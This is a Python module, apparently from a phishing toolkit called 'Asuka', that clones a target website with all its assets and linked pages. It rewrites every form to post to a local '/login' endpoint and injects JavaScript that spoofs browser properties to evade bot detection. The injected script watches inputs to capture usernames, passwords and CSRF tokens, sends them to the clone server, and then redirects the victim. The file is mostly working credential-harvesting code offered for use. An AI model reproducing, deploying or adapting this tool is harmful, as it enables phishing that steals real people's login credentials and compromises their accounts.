#!/usr/bin/env python3
"""
Asuka Website Cloning Module
Clones a target website, including design, layout, and assets, and captures raw form inputs.
Uses Playwright for dynamic rendering, BeautifulSoup for HTML parsing, and Fernet for encryption.
"""

import os
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import logging
import time
from cryptography.fernet import Fernet
import base64
from playwright.sync_api import sync_playwright
from .utils import download_asset

def configure_logging(show_logs):
    """
    Configures logging to write to a file and optionally to the console.
    
    Args:
        show_logs (bool): If True, logs are also output to the console.
    """
    handlers = [logging.FileHandler('clone.log')]
    if show_logs:
        handlers.append(logging.StreamHandler())
    
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=handlers
    )

# Global Fernet key for encryption/decryption
fernet_key_file = 'fernet_key.bin'
if not os.path.exists(fernet_key_file):
    fernet_key = Fernet.generate_key()
    with open(fernet_key_file, 'wb') as f:
        f.write(fernet_key)
else:
    with open(fernet_key_file, 'rb') as f:
        fernet_key = f.read()
cipher = Fernet(fernet_key)

def initialize_browser(user_agent, headless=True):
    """
    Initializes a Playwright browser instance for rendering dynamic content.
    
    Args:
        user_agent (str): User agent string for HTTP requests.
        headless (bool): Whether to run the browser in headless mode.
    
    Returns:
        tuple: Playwright instance, browser, and browser context.
    """
    p = sync_playwright().start()
    browser = p.chromium.launch(headless=headless)
    context = browser.new_context(
        user_agent=user_agent,
        viewport={'width': 1920, 'height': 1080},
        device_scale_factor=1,
        bypass_csp=True
    )
    return p, browser, context

def close_browser(playwright_instance, browser, context):
    """
    Closes the Playwright browser instance and cleans up resources.
    """
    context.close()
    browser.close()
    playwright_instance.stop()

def get_page_content(url, context, user_agent):
    """
    Fetches the rendered HTML content, ensuring all dynamic content is loaded.
    
    Args:
        url (str): Target URL to fetch.
        context: Playwright browser context.
        user_agent (str): User agent string for the request.
    
    Returns:
        str: Rendered HTML content of the page.
    """
    page = context.new_page()
    try:
        page.on("request", lambda request: logging.debug(f"Request: {request.url}"))
        page.goto(url, wait_until="networkidle", timeout=120000)
        page.wait_for_timeout(10000)
        html = page.content()
    except Exception as e:
        logging.error(f"Error fetching {url}: {e}")
        html = ""
    finally:
        page.close()
    return html

def get_dynamic_assets(html, context, user_agent):
    """
    Extracts dynamically loaded assets (images, CSS, JS, fonts) from the HTML.
    
    Args:
        html (str): HTML content to analyze.
        context: Playwright browser context.
        user_agent (str): User agent string for rendering.
    
    Returns:
        list: List of asset URLs (excluding data URLs).
    """
    js_code = '''
        () => {
            const assets = new Set();
            document.querySelectorAll('img, [style*="background-image"]').forEach(el => {
                if (el.src && !el.src.startsWith('data:')) assets.add(el.src);
                if (el.style.backgroundImage) {
                    const url = el.style.backgroundImage.match(/url\\(["']?(.*?)["']?\\)/)?.[1];
                    if (url && !url.startsWith('data:')) assets.add(url);
                }
            });
            document.querySelectorAll('link[rel="stylesheet"]').forEach(link => {
                if (link.href && !link.href.startsWith('data:')) assets.add(link.href);
            });
            document.querySelectorAll('script[src]').forEach(script => {
                if (script.src && !script.src.startsWith('data:')) assets.add(script.src);
            });
            document.styleSheets.forEach(sheet => {
                try {
                    Array.from(sheet.cssRules).forEach(rule => {
                        if (rule.type === CSSRule.IMPORT_RULE && rule.href) {
                            assets.add(rule.href);
                        } else if (rule.style) {
                            ['src', 'background', 'background-image', 'font-face'].forEach(prop => {
                                const url = rule.style.getPropertyValue(prop)?.match(/url\\(["']?(.*?)["']?\\)/)?.[1];
                                if (url && !url.startsWith('data:')) assets.add(url);
                            });
                        }
                    });
                } catch (e) {}
            });
            return Array.from(assets);
        }
    '''
    page = context.new_page()
    try:
        page.set_content(html)
        assets = page.evaluate(js_code)
    except Exception as e:
        logging.error(f"Error extracting dynamic assets: {e}")
        assets = []
    finally:
        page.close()
    return assets

def clone_linked_pages(url, html, user_agent, base_path, max_depth=3, visited=None, disable_scripts=False):
    """
    Recursively clones linked pages from the target website.
    """
    if visited is None:
        visited = set()
    if max_depth <= 0 or url in visited:
        return
    visited.add(url)
    try:
        soup = BeautifulSoup(html, 'html.parser')
        base_url = urljoin(url, '/')
        playwright_instance, browser, context = initialize_browser(user_agent)
        link_html = get_page_content(url, context, user_agent)
        close_browser(playwright_instance, browser, context)
        link_soup = BeautifulSoup(link_html, 'html.parser')
        for a in link_soup.find_all('a', href=True):
            href = a['href']
            full_url = urljoin(base_url, href)
            if urlparse(full_url).netloc == urlparse(url).netloc:
                relative_path = urlparse(full_url).path.lstrip('/') or 'index_' + os.urandom(4).hex() + '.html'
                a['href'] = relative_path
        if disable_scripts:
            for script in link_soup.find_all('script'):
                script.decompose()
        link_path = os.path.join(base_path, urlparse(url).path.lstrip('/') or 'index_' + os.urandom(4).hex() + '.html')
        os.makedirs(os.path.dirname(link_path), exist_ok=True)
        link_html = download_assets(link_html, url, os.path.dirname(link_path), user_agent)
        with open(link_path, 'w', encoding='ascii', errors='ignore') as f:
            f.write(link_html)
        logging.info(f"Cloned linked page: {link_path}")
        for a in soup.find_all('a', href=True):
            link = urljoin(base_url, a['href'])
            if urlparse(link).netloc == urlparse(url).netloc and link not in visited:
                clone_linked_pages(link, link_html, user_agent, base_path, max_depth - 1, visited, disable_scripts)
    except Exception as e:
        logging.error(f"Error processing linked pages for {url}: {e}")

def download_assets(html, url, base_path, user_agent):
    """
    Downloads all assets and updates HTML to point to local copies.
    """
    try:
        soup = BeautifulSoup(html, 'html.parser')
        base_url = urljoin(url, '/')
        session = requests.Session()
        session.headers.update({'User-Agent': user_agent})

        assets = []
        downloaded = set()
        for tag in soup.find_all(['img', 'script', 'source'], src=True):
            if tag['src'] and tag['src'] not in downloaded:
                assets.append((tag, 'src', tag['src']))
                downloaded.add(tag['src'])
        for tag in soup.find_all('link', href=True):
            if tag['href'] and tag['href'] not in downloaded:
                assets.append((tag, 'href', tag['href']))
                downloaded.add(tag['href'])
        for tag in soup.find_all(True, style=True):
            urls = re.findall(r'url\(["\']?(.*?)["\']?\)', tag['style'])
            for u in urls:
                if u and u not in downloaded:
                    assets.append((tag, 'style', u))
                    downloaded.add(u)
        for style in soup.find_all('style'):
            urls = re.findall(r'url\(["\']?(.*?)["\']?\)', style.get_text())
            for u in urls:
                if u and u not in downloaded:
                    assets.append((style, 'css', u))
                    downloaded.add(u)

        playwright_instance, browser, context = initialize_browser(user_agent)
        dynamic_assets = get_dynamic_assets(html, context, user_agent)
        close_browser(playwright_instance, browser, context)
        for asset_url in dynamic_assets:
            if asset_url not in downloaded:
                assets.append((None, 'dynamic', asset_url))
                downloaded.add(asset_url)

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for tag, attr, asset_url in assets:
                futures.append(executor.submit(download_asset, asset_url, base_url, base_path, session))

            for future, (tag, attr, asset_url) in zip(futures, assets):
                filename = future.result()
                if filename:
                    if tag and attr in ('src', 'href'):
                        tag[attr] = filename
                    elif tag and attr == 'style':
                        tag['style'] = tag['style'].replace(asset_url, filename)
                    elif tag and attr == 'css':
                        tag.string = tag.get_text().replace(asset_url, filename)
                    logging.debug(f"Downloaded asset: {asset_url} -> {filename}")

                    if filename.endswith('.css'):
                        css_path = os.path.join(base_path, filename)
                        if os.path.exists(css_path):
                            with open(css_path, 'r', encoding='utf-8', errors='ignore') as f:
                                css_content = f.read()
                            css_urls = re.findall(r'url\(["\']?(.*?)["\']?\)', css_content)
                            import_urls = re.findall(r'@import\s+url\(["\']?(.*?)["\']?\)', css_content)
                            for css_url in css_urls + import_urls:
                                if css_url not in downloaded:
                                    nested_filename = download_asset(css_url, base_url, base_path, session)
                                    if nested_filename:
                                        css_content = css_content.replace(css_url, nested_filename)
                                        downloaded.add(css_url)
                                        logging.debug(f"Downloaded nested CSS asset: {css_url} -> {nested_filename}")
                            with open(css_path, 'w', encoding='utf-8') as f:
                                f.write(css_content)

                else:
                    logging.warning(f"Failed to download asset: {asset_url}")

        base_tag = soup.new_tag('base', href='/')
        if soup.head:
            soup.head.insert(0, base_tag)
        else:
            soup.insert(0, base_tag)

        logging.info(f"Processed {len(assets)} assets for {url}")
        return str(soup)
    except Exception as e:
        logging.error(f"Error downloading assets: {e}")
        return html

def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js='', disable_scripts=False, redirect_url='', show_logs=False):
    """
    Clones a target website and modifies forms for credential capture.
    
    Args:
        url (str): Target URL to clone.
        user_agent (str): User agent string for HTTP requests.
        download_assets_flag (bool): Whether to download assets.
        multi_page (bool): Whether to clone linked pages.
        custom_js (str): Path to custom JavaScript file to inject.
        disable_scripts (bool): Whether to remove script tags.
        redirect_url (str): URL to redirect to after form submission.
        show_logs (bool): Whether to show logs in the console.
    
    Returns:
        str: Path to the cloned index.html file, or None on failure.
    """
    configure_logging(show_logs)
    try:
        u = url.replace('://', '-').replace('/', '_').replace('?', '_').replace('&', '_')
        q = f'templates/fake/{user_agent}/{u}'
        os.makedirs(q, exist_ok=True)
        temp_ind_path = os.path.join(q, 'index.html')

        playwright_instance, browser, context = initialize_browser(user_agent)
        html = get_page_content(url, context, user_agent)
        close_browser(playwright_instance, browser, context)

        if not html:
            logging.error(f"Failed to fetch content from {url}")
            return None

        soup = BeautifulSoup(html, 'html.parser')
        if not soup.find('form'):
            logging.warning(f"No forms found on {url}, cloning may be incomplete")

        base_url = urljoin(url, '/')
        for tag in soup.find_all(['a', 'link'], href=True):
            href = urljoin(base_url, tag['href'])
            tag['href'] = urlparse(href).path.lstrip('/') or 'index_' + os.urandom(4).hex() + '.html'
        for tag in soup.find_all(['img', 'script', 'source'], src=True):
            src = urljoin(base_url, tag['src'])
            tag['src'] = urlparse(src).path.lstrip('/') or 'asset_' + os.urandom(4).hex()

        for form in soup.find_all('form'):
            form['action'] = '/login'
            form['method'] = 'POST'
            hidden_input = soup.new_tag('input')
            hidden_input['type'] = 'hidden'
            hidden_input['name'] = 'data'
            hidden_input['id'] = 'encrypted_data'
            form.append(hidden_input)

        custom_js_code = ''
        if custom_js and os.path.exists(custom_js):
            with open(custom_js, 'r', encoding='utf-8') as f:
                custom_js_code = f.read()
                logging.info(f"Injected custom JavaScript from {custom_js}")

        obfuscation_script = f"""
        <script>
        (function() {{
            try {{
                console.log('[Asuka] Script initialized');
                // Spoof browser properties
                Object.defineProperty(navigator, 'webdriver', {{ get: () => false }});
                Object.defineProperty(navigator, 'plugins', {{ get: () => [{{name: 'Chrome PDF Plugin'}}, {{name: 'Chrome PDF Viewer'}}] }});
                Object.defineProperty(navigator, 'platform', {{ get: () => 'Win32' }});
                window.chrome = {{ runtime: {{}} }};

                // Error logging
                function logError(message) {{
                    console.error('[Asuka] ' + message);
                    fetch(window.location.origin + '/error_log', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                        body: 'error=' + encodeURIComponent(message)
                    }}).catch(e => console.error('[Asuka] Error logging failed: ' + e));
                }}

                // Store form data
                const formData = {{}};
                function updateFormData(input) {{
                    const name = input.getAttribute('name') || input.getAttribute('id') || 'field_' + Math.random().toString(36).substr(2, 8);
                    formData[name] = input.value;
                    logError('Updated form data: ' + name + '=' + input.value);
                }}

                // Identify fields
                function isPasswordField(input) {{
                    const name = (input.getAttribute('name') || '').toLowerCase();
                    const id = (input.getAttribute('id') || '').toLowerCase();
                    const type = input.type.toLowerCase();
                    const label = (input.closest('label')?.textContent || 
                                 input.getAttribute('aria-label') || 
                                 input.getAttribute('placeholder') || '').toLowerCase();
                    return /password|pass|pwd/i.test(name) ||
                           /password|pass|pwd/i.test(id) ||
                           /password|pass|pwd/i.test(label) ||
                           type === 'password' ||
                           input.autocomplete === 'current-password';
                }}

                function isUsernameField(input) {{
                    const name = (input.getAttribute('name') || '').toLowerCase();
                    const id = (input.getAttribute('id') || '').toLowerCase();
                    const type = input.type.toLowerCase();
                    const label = (input.closest('label')?.textContent || 
                                 input.getAttribute('aria-label') || 
                                 input.getAttribute('placeholder') || '').toLowerCase();
                    return (type === 'email' || type === 'text' || type === 'tel') &&
                           (/login|username|email|user|account|id/i.test(name) ||
                            /login|username|email|user|account|id/i.test(id) ||
                            /login|username|email|user|account|id/i.test(label) ||
                            input.autocomplete === 'username' ||
                            input.autocomplete === 'email');
                }}

                // Generate unique request ID
                function generateRequestId() {{
                    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {{
                        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                        return v.toString(16);
                    }});
                }}

                // Send credentials
                function sendCredentials(obj, requestId) {{
                    logError('Sending credentials with requestId: ' + requestId + ', data: ' + JSON.stringify(obj));
                    const encrypted = '{base64.b64encode(fernet_key).decode()}:' + btoa(JSON.stringify(obj));
                    fetch('/login', {{
                        method: 'POST',
                        headers: {{ 
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'X-Obfuscated': 'true',
                            'X-Request-Id': requestId
                        }},
                        body: 'data=' + encodeURIComponent(encrypted)
                    }}).then(response => {{
                        logError('Fetch response for requestId ' + requestId + ': ' + response.status);
                        window.location.href = '{redirect_url}' || response.headers.get('Location') || '/';
                    }}).catch(e => {{
                        logError('Fetch error for requestId ' + requestId + ': ' + e.message);
                        window.location.href = '{redirect_url}' || '/';
                    }});
                }}

                // Process forms
                function processForm(form) {{
                    if (form.hasAttribute('data-asuka-processed')) return;
                    form.setAttribute('data-asuka-processed', 'true');
                    form.action = '/login';
                    form.method = 'POST';
                    form.removeAttribute('onsubmit');
                    const submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
                    submitButtons.forEach(btn => {{
                        btn.removeAttribute('onclick');
                    }});
                    logError('Processing form: action=' + form.action);

                    const inputs = form.querySelectorAll('input, textarea, select');
                    inputs.forEach(input => {{
                        const name = input.getAttribute('name') || input.getAttribute('id') || 'field_' + Math.random().toString(36).substr(2, 8);
                        input.setAttribute('name', name);
                        if (isPasswordField(input)) {{
                            input.setAttribute('data-field-type', 'password');
                            input.autocomplete = 'off';
                        }} else if (isUsernameField(input)) {{
                            input.setAttribute('data-field-type', 'username');
                        }}
                        ['input', 'change', 'keyup'].forEach(event => {{
                            input.addEventListener(event, () => updateFormData(input));
                        }});
                        updateFormData(input);
                        logError('Processed input: name=' + name + ', type=' + input.getAttribute('data-field-type'));
                    }});

                    let isSubmitting = false;
                    form.addEventListener('submit', e => {{
                        e.preventDefault();
                        e.stopPropagation();
                        if (isSubmitting) {{
                            logError('Submission blocked: already submitting');
                            return;
                        }}
                        isSubmitting = true;
                        logError('Form submit triggered');
                        const obj = {{ ...formData }};
                        const inputs = form.querySelectorAll('input, textarea, select');
                        inputs.forEach(input => {{
                            const name = input.getAttribute('name') || input.getAttribute('id') || 'field_' + Math.random().toString(36).substr(2, 8);
                            const value = input.value;
                            if (value && !value.startsWith('#PWD_BROWSER')) {{
                                if (input.getAttribute('data-field-type') === 'password') {{
                                    obj['password'] = value;
                                }} else if (input.getAttribute('data-field-type') === 'username') {{
                                    obj['username'] = value;
                                }} else if (/authenticity_token|csrfmiddlewaretoken|csrf_token|csrftoken/i.test(name)) {{
                                    obj['csrf_token'] = value;
                                }}
                                obj[name] = value;
                            }}
                        }});
                        if (obj.username && obj.password) {{
                            const requestId = generateRequestId();
                            sendCredentials(obj, requestId);
                        }} else {{
                            logError('No valid credentials to send');
                            window.location.href = '{redirect_url}' || '/';
                        }}
                    }}, {{ once: true }});
                }}

                // Process existing forms
                document.querySelectorAll('form').forEach(form => processForm(form));

                // Monitor dynamic forms
                const observer = new MutationObserver(mutations => {{
                    mutations.forEach(mutation => {{
                        if (mutation.addedNodes.length) {{
                            mutation.addedNodes.forEach(node => {{
                                if (node.tagName === 'FORM') {{
                                    processForm(node);
                                }} else if (node.querySelectorAll) {{
                                    node.querySelectorAll('form').forEach(form => processForm(form));
                                }}
                            }});
                        }}
                    }});
                }});
                observer.observe(document.body, {{ childList: true, subtree: true }});

                {custom_js_code}
            }} catch (e) {{
                logError('Script error: ' + e.message);
                alert('[Asuka] Script error: ' + e.message);
            }}
        }})();
        </script>
        """
        html = html.replace("</body>", obfuscation_script + "</body>")

        if download_assets_flag:
            html = download_assets(html, url, q, user_agent)

        with open(temp_ind_path, 'w', encoding='ascii', errors='ignore') as new_html:
            new_html.write(html)

        if not os.path.exists(temp_ind_path):
            logging.error(f"Failed to save template at {temp_ind_path}")
            return None

        logging.info(f"Cloned page saved to: {temp_ind_path}")
        print(f"[+] Cloned page saved to: {temp_ind_path}")

        if multi_page:
            clone_linked_pages(url, html, user_agent, q, max_depth=3, disable_scripts=disable_scripts)

        return temp_ind_path
    except Exception as e:
        logging.error(f"Unexpected error cloning {url}: {e}")
        print(f"Unexpected error: {e}")
        return None
